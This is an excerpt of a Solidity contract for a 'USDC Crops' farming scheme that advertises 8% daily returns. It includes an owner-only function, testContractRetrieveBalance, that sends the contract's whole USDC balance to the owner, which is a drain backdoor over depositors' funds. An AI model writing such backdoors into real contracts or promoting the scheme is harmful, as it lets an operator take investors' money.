...
/******* TEST CONTRACT - YOU'VE BEEN WARNED!!*******/
...
contract USDC_Crops {
    ...
    function testContractRetrieveBalance() public{
        require(msg.sender == owner, "Admin use only.");
        token_USDC.transfer(msg.sender, getBalance());
    }
...
/**
USDC Crops Farmer
 Hire Farmers, Gather Crops, Harvest Crops and Sell for USDC. 
  8% daily daily Rate
  ...
  10 USDC minimum investment.
  10,000 USDC max deposits per wallet.
